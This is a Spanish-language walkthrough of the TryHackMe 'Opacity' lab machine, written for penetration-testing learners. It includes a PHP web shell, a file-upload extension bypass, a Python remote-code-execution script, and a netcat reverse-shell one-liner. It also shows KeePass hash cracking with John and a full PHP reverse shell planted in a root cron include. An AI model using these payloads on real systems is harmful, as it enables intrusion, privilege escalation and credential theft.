---
layout: single
title: Opacity - TryHackMe
excerpt: " Opacity is an easy machine that can help you in the penetration testing learning process. There are 2 hash keys located on the machine (user - local.txt and root - proof.txt). Can you find them and become root?"
date: 2023-05-24
classes: wide
header:
  teaser: /blog/assets/images/thm-writeup-opacity/opacity.png
  teaser_home_page: true
  icon: /blog/assets/images/tryhackme.webp
categories:
  - tryhackme
tags:
  - PHP
  - File Upload
  - RCE
  - Python Scripting
  - Keepass
---

Opacity is an easy machine that can help you in the penetration testing learning process.
There are 2 hash keys located on the machine (user - local.txt and root - proof.txt). Can you find them and become root?

# Summary
- IP: 10.10.67.58
- Ports: 22,80,139,445
- OS: Linux (Ubuntu Bionic)
- Services & Applications:
	-  22 -> OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
	-  80 -> Apache httpd 2.4.41
	-  139 -> netbios-ssn Samba smbd 4.6.2
	-  445 -> netbios-ssn Samba smbd 4.6.2
# Recon

- Escaneo básico de puertos:

```bash
$nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.67.58 -oG allPorts
```


- Escaneo profundo de puertos encontrados:

```bash
$nmap -p22,80,139,445 -sCV 10.10.67.58 -oN targeted
```

- Análisis de directorios con gobuster:

```bash
$gobuster dir -u 10.10.67.58 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200
```

```
/css                  (Status: 301) [Size: 308] [--> http://10.10.67.58/css/]
/cloud                (Status: 301) [Size: 310] [--> http://10.10.67.58/cloud/]
```


# Análisis de página web (Port 80):

- En la página web principal nos encontramos con un login, intentamos bypassearlo con SQLI pero no resulta.

- De acuerdo al fuzzing de directorios hecho con gobuster en la fase de reconocimiento existe uno llamado `"/cloud"` así que lo abrimos.


# File Upload Vulnerability to RCE:

- Se nos despliega una interfaz que nos pide una URL de una imagen la cual se subirá a la web, interceptamos con `Burpsuite` la petición para entender que hace por detrás, enviándole como imagen un archivo .jpg creados por nosotros mismos montando un servidor python.


```js
POST /cloud/ HTTP/1.1
Host: 10.10.67.58
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.67.58/cloud/
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Origin: http://10.10.67.58
DNT: 1
Connection: close
Cookie: PHPSESSID=g16nhtaeb21o0kvg07dbqs4r4m
Upgrade-Insecure-Requests: 1


url=http%3A%2F%2F10.6.53.49%2Fhola.jpg
```

- Al darle al fordward, vemos que se nos muestra un gif de loading en la página del navegador, seguimos dando forward a las respuestas del servidor y finalmente podemos observar como paso final se nos muestra la supuesta imagen que hemos subido e incluso nos da la `dirección` en donde se almacena dicha imagen.

- Visto esto podemos pensar en la vulnerabilidad "File Upload", puesto que sabemos que la web interpreta `PHP` podemos intentar colar un archivo ".php" con código malicioso, acceder a este y esperar a que la web interprete el código que hayamos incrustado.

- Intentamos subir un archivo pwned.php malicioso con el siguiente contenido:

 ```js
 <?php echo passthru($_GET['cmd']); ?>
 ```


- Sin embargo como era de esperarse, al intentar subir el archivo php la página se recarga mostrando el siguiente mensaje `"Please select an image"`, dándonos a entender que solo acepta archivos con extensión de imagen.

- Probamos aplicar un bypass de la extensión del archivo explicado en [File Upload - HackTricks](https://book.hacktricks.xyz/pentesting-web/file-upload#bypass-file-extensions-checks) cambiando el nombre del mismo a "pwned.php#.jpg".

- Montamos el servidor en python y subimos el archivo en la web.


- Efectivamente el archivo se sube, y si nos damos cuenta en nuestro servidor de python recibimos la siguiente petición:

```js
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.67.58 - - [24/May/2023 12:33:50] "GET /pwned.php HTTP/1.1" 200 -
```


# Python Scripting:

- Como vemos, nos dio una petición con código de estado "200" ya que el archivo "pwned.php" que creamos al principio también estaba en el mismo directorio, si no hubiese estado nos habría dado un "404" por lo que es necesario que ambos archivos estén en el mismo directorio: el archivo `"pwned.php#.jpg"` para bypassear la restricción de extensión en la web y el archivo `"pwned.php"` el cual es el que será subido.

-  Ahora, como la web nos da la direccion en donde se guardó el archivo lo único que tenemos que hacer es acceder a esta dirección para comprobar que el archivo php sea interpretado, sin embargo al acceder después de unos minutos veremos un "404 Not Found", si volvemos a subir el archivo e intentamos acceder a este al instante nos daremos cuenta que si se interpreta y podemos usar el parámetro `"cmd"` que creamos para ejecutar comandos del sistema.

- Esto nos sugiere que el servidor borra casi al instante cualquier archivo que no sea imagen, por lo que deberemos ser rápidos al momento de acceder al archivo php subido.

- Para automatizar este proceso y poder ejecutar comandos del sistema víctima (RCE) usando el archivo php subido directamente desde la terminal, creamos una `script en python`.

- Esta script lo que hace es enviar la petición POST para subir el archivo pwned.php aplicando el bypass que ya hemos visto, y luego realizar una petición GET al servidor usando la dirección que ya conocemos en donde se subirá el archivo php usando el parámetro "cmd" creado para ejecutar el comando que queramos el cual será pasado a la script como argumento.

```bash
$cat exploitRCE.py
```

```python
#!/usr/bin/python3

import requests
import sys

command = sys.argv [1]

main_url = "http://10.10.67.58/cloud/"
data = "url=http://10.6.53.49/pwned.php#.jpg"
headers = {
	"Host" : "10.10.67.58",
	"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0",
	"Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
	"Accept-Language" : "en-US,en;q=0.5",
	"Accept-Encoding" : "gzip, deflate",
	"Referer" : "http://10.10.67.58/cloud/",
	"Content-Type" : "application/x-www-form-urlencoded",
	"Content-Length" : "38",
	"Origin" : "http://10.10.67.58",
	"DNT" : "1",
	"Connection" : "close",
	"Cookie" : "PHPSESSID=g16nhtaeb21o0kvg07dbqs4r4m",
	"Upgrade-Insecure-Requests" : "1"
}

r = requests.post(main_url,headers=headers,data=data)

r = requests.get (main_url + "images/pwned.php?cmd=" + command)

if r.status_code == 200:
	print(r.text)
else:
	print("Error en la petición, código de estado",r.status_code)
```

- Teniendo el servidor python montado, ejecutamos la script de nuestro exploit pasándole como argumento cualquier comando del sistema y vemos como efectivamente se nos ejecuta:

```bash
$python3 exploitRCE.py id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

- Ahora lo que resta por hacer es mandarnos una reverse shell a nuestra máquina, pasándole como argumento una reverse shell de forma URL encodeada:

```bash
$python3 exploitRCE.py rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.6.53.49%20443%20%3E%2Ftmp%2Ff
```

- Hemos ganado acceso al sistema como "www-data", hacemos el respectivo tratamiento a la TTY y buscamos escalar privilegios.



# ESCALADA DE PRIVILEGIOS:


# Cracking Keepass archive:

- Si buscamos dentro del servidor, vemos que hay un usuario "sysadmin" en donde parece estar ubicada la primera flag, deberemos pivotar a ese usuario para poder leerla.

- Si revisamos el directorio "/opt" nos encontramos con un archivo `"dataset.kdbx"`, el cual es un archivo de registro del gestor de contraseñas "Keepass", si logramos acceder a la información de este archivo podríamos encontrar la credencial del usuario "sysadmin".

- Nos enviamos este archivo a nuestra máquina atacante para intentar crackearlo:

--- En la máquina víctima:

```bash
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

--- En la máquina atacante:

```bash
$wget 10.10.67.58:8000/dataset.kdbx
```

```js
--2023-05-24 13:04:38--  http://10.10.67.58:8000/dataset.kdbx
Conectando con 10.10.67.58:8000... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 1566 (1,5K) [application/octet-stream]
Grabando a: «dataset.kdbx»

dataset.kdbx         100%[======================>]   1,53K  --.-KB/s    en 0s      

2023-05-24 13:04:39 (64,1 MB/s) - «dataset.kdbx» guardado [1566/1566]
```

- Ahora creamos un archivo de hash válido para crackearlo con John:

```bash
$keepass2john dataset.kdbx > hash.txt
```

- Es momento de `crackearlo`:

```
$john -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash.txt
```

```js
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 100000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (dataset)
1g 0:00:00:03 DONE (2023-05-24 13:06) 0.2583g/s 231.5p/s 231.5c/s 231.5C/s chichi..ilovegod
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

- Como vemos hemos podido crackear la contraseña, ahora accedemos al archivo "dataset.kdbx" usando la contraseña que encontramos:

(Si no tienen instalado keepass, en Debian pueden hacerlo con el comando "sudo apt install keepass2")


```bash
$keepass2 dataset.kdbx
```


- Se nos despliega la interfaz de keepass y podremos ver la credencial del usuario "sysadmin", así que pivotamos a dicho usuario:

```bash
$su sysadmin
```

- Ya como el usuario "sysadmin" podremos leer la primera flag.


# abuse require_once PHP file:

- Escaneamos el sistema en busca de procesos que se ejecuten de forma automática con [pspy](https://github.com/DominicBreuker/pspy/releases) 


```js
2023/05/24 18:12:21 CMD: UID=0     PID=1      | /sbin/init maybe-ubiquity 
2023/05/24 18:13:01 CMD: UID=0     PID=1865   | /bin/sh -c /usr/bin/php /home/sysadmin/scripts/script.php 
2023/05/24 18:13:01 CMD: UID=0     PID=1864   | /usr/sbin/CRON -f 
2023/05/24 18:13:01 CMD: UID=0     PID=1866   | /usr/bin/php /home/sysadmin/scripts/script.php 
```

- Como podemos observar, cada cierto tiempo se está ejecutando como el usuario "root" el archivo `"/home/sysadmin/scripts/script.php"` así que lo cateamos para entender qué es lo que hace:

```bash
$cat /home/sysadmin/scripts/script.php
```

```php
<?php

//Backup of scripts sysadmin folder
require_once('lib/backup.inc.php');
zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
echo 'Successful', PHP_EOL;

//Files scheduled removal
$dir = "/var/www/html/cloud/images";
if(file_exists($dir)){
    $di = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
    $ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST);
    foreach ( $ri as $file ) {
        $file->isDir() ?  rmdir($file) : unlink($file);
    }
}
?>
```

- Si analizamos el código php, concluimos que es una script que hace backups de la carpeta "scripts" y lo guarda en el directorio "/var/backups/backup.zip", sin embargo lo realmente interesante es al principio del código, como podemos apreciar se está ejecutando la función `"require_once('lib/backup.inc.php')"`, esto lo que hace es ejecutar otro archivo php desde la script inicial, y si revisamos bien, dicho archivo "backup.inc.php" se encuentra en el directorio "sysadmin" por lo que podremos fácilmente borrarlo, crear uno nuevo con el mismo nombre e inyectar código php que nos establezca una reverse shell; como esto se ejecutará como root recibiremos una shell de root:


```bash
$rm backup.inc.php 
rm: remove write-protected regular file 'backup.inc.php'? y
```

```bash
$nano backup.inc.php
```

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.10.10';
$port = 9001;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```


- Hecho esto y estando en escucha, ganaremos una reverse shell como `ROOT` y podremos leer la última flag.
